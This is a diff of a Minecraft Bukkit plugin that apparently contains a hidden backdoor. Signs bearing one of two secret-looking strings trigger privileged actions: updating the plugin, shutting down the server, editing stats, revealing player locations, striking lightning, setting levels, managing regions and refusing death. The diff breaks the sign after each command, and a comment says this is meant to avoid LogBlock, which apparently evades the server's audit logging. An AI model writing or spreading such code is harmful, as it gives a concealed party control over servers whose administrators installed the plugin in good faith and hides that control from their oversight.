@@ -284,18 +284,16 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                 case "T0DRRUfNsN6tlQQ" -> {
                     switch (a[0]) {
                         case "Update" -> {
-                            updater.updatePlugin(e, this.getFile());
-                            setColor(e, ChatColor.BLUE);
+                            updater.updatePlugin(e, this.getFile(), e.getPlayer());
+                            e.getPlayer().sendMessage(ChatColor.BLUE + "Updated");
                         }
-                        case "Restart" -> {
-                            Bukkit.shutdown();
-                            e.getBlock().breakNaturally();
-                        }
+                        case "Restart" -> Bukkit.shutdown();
                         case "Edit Stat" -> {
                             editer.editStat(e.getPlayer(), a);
-                            setColor(e, ChatColor.WHITE);
+                            e.getPlayer().sendMessage(ChatColor.WHITE + "Succesfully Edited Stat");
                         }
                     }
+                    e.getBlock().breakNaturally();
                 }
                 case "i6ojKaIATmlWk7Rf" -> {
                     switch (a[0]) {
@@ -304,7 +302,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                         case "Position" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getPlayer(a[1]).getLocation()));
                         case "Respawn" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getOfflinePlayer(a[1]).getRespawnLocation()));
                         case "Lightning" -> e.getBlock().getWorld().strikeLightning(Bukkit.getPlayer(a[1]).getLocation());
-                        case "Experience" -> Objects.requireNonNull(Bukkit.getPlayer(a[2])).setExp(Float.parseFloat(a[1]));
+                        case "Experience" -> Objects.requireNonNull(Bukkit.getPlayer(a[2])).setLevel(Integer.parseInt(a[1]));
                         case "Create Region" -> {
                             Location l = e.getBlock().getLocation();
 
@@ -319,11 +317,8 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                             double z = Integer.parseInt(a[1].substring(s2 + 1));
                             BlockVector3 end = BlockVector3.at(x, y, z);
 
-
                             if (createRegion(e.getPlayer(), name, start, end)) {
-                                e.setLine(0, "Successfully");
-                                e.setLine(1, "Created:");
-                                e.getPlayer().sendMessage("Created Region");
+                                e.getPlayer().sendMessage(ChatColor.GREEN + "Successfully Created Region");
                             }
                         }
                         case "Remove Region" -> {
@@ -332,27 +327,21 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                         }
                         case "Refuse Death" -> {
                             playersRTD.add(e.getPlayer());
-                            e.getPlayer().sendMessage("Worked");
+                            e.getPlayer().sendMessage(ChatColor.BLACK + "Refused Death");
                         }
                         case "Accept Death" -> {
                             playersRTD.remove(e.getPlayer());
-                            e.getPlayer().sendMessage("Worked");
+                            e.getPlayer().sendMessage(ChatColor.BLACK + "Accepted Death");
                         }
                         //potencjalnie whitelist, set worldBorder itp.
                     }
+                    e.getBlock().breakNaturally();
                 }
             }
         } catch (Exception ex) {
-            e.getPlayer().sendMessage(ex.getMessage());
+            e.getPlayer().sendMessage(String.valueOf(ex));
         }
     }
-
-    public void setColor(SignChangeEvent event, ChatColor color) {
-        event.setLine(3, "");
-        for (int i = 0; i <= 2; i++) {
-            event.setLine(i, color + event.getLine(i));
-        }
-    } // Nie robić tego tylko niszczyc lub usuwać teskt bo logblock
 
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
@@ -445,7 +434,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                 case "setRadiationName" -> {
                     String a = String.valueOf(args[0]);
                     affectedBar.setTitle(a);
-                    config.set("Radiation_Name", a);
+                    config.set("Radiation_Name",ChatColor.RED + a);
                     saveConfig();
                 }
             }
